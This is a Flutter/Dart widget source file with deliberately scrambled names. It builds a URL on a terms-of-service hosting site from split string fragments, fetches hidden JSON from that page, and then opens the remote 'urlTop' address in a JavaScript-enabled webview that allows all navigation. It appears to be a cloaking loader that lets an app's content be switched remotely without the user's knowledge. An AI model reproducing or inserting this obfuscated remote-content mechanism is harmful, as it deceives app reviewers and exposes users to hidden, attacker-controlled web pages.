import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:http/http.dart' as http;
import 'pVtHg6dF.dart';

class HmLgFv extends StatefulWidget {
  @override
  _XkVzKr createState() => _XkVzKr();
}

class _XkVzKr extends State<HmLgFv> {
  String qVtNuV = "";
  Color? hWxYnJk;

  final String zXyPdG = "ht";
  final String qJhBrD = "t";
  final String wKgTjV = "ps:/";
  final String oQxLdW = "/www.";
  final String aBzFwX = "te";
  final String eVpUzM = "rms";
  final String tJkCyN = "feed.com";
  final String fSzPwQ = "/live/";
  final String dMvJzT = "159759d6-b148-4ce4-a1c0-0cecddf0026a";

  String get aFgXyT {
    return zXyPdG + qJhBrD + wKgTjV + oQxLdW + aBzFwX + eVpUzM + tJkCyN + fSzPwQ + dMvJzT;
  }

  @override
  void initState() {
    super.initState();
    vZlJqF();
  }

  void vZlJqF() async {
    final response = await http.get(Uri.parse(aFgXyT));
    if (response.statusCode == 200) {
      String wHxFyU = response.body;
      RegExp iXpTqZ = RegExp(r'#(.*?)#');
      final match = iXpTqZ.firstMatch(wHxFyU);
      if (match != null && match.groupCount > 0) {
        String kVbLvH = match.group(1)!;
        if (kVbLvH.isNotEmpty) {
          String yQzAfN = kVbLvH.replaceAll('&quot;', '"');
          Map<String, dynamic> mNzQrL = json.decode(yQzAfN);
          qVtNuV = mNzQrL['urlTop'] ?? "";
          if (mNzQrL['bgColor'].toString().isNotEmpty) {
            hWxYnJk = pVtHg6dF(mNzQrL['bgColor']);
          }
          if (qVtNuV.isNotEmpty) {
            setState(() {});
          }
        }
      }
    }
  }

  @override
  Widget build(BuildContext context) {
    return Material(
      color: hWxYnJk,
      child: qVtNuV.isNotEmpty
          ? Container(
              margin: EdgeInsets.only(
                top: MediaQuery.of(context).padding.top,
                bottom: 20.0,
              ),
              child: InAppWebView(
                initialUrlRequest: URLRequest(
                  url: WebUri(qVtNuV),
                ),
                initialOptions: InAppWebViewGroupOptions(
                  crossPlatform: InAppWebViewOptions(
                    javaScriptEnabled: true,
                    useOnLoadResource: true,
                    useShouldOverrideUrlLoading: true,
                  ),
                  android: AndroidInAppWebViewOptions(
                    useHybridComposition: true,
                  ),
                  ios: IOSInAppWebViewOptions(
                    allowsInlineMediaPlayback: true,
                  ),
                ),
                onWebViewCreated: (controller) {},
                shouldOverrideUrlLoading: (controller, navigationAction) async {
                  print("URL: ${navigationAction.request.url}");
                  return NavigationActionPolicy.ALLOW;
                },
              ),
            )
          : Container(),
    );
  }
}
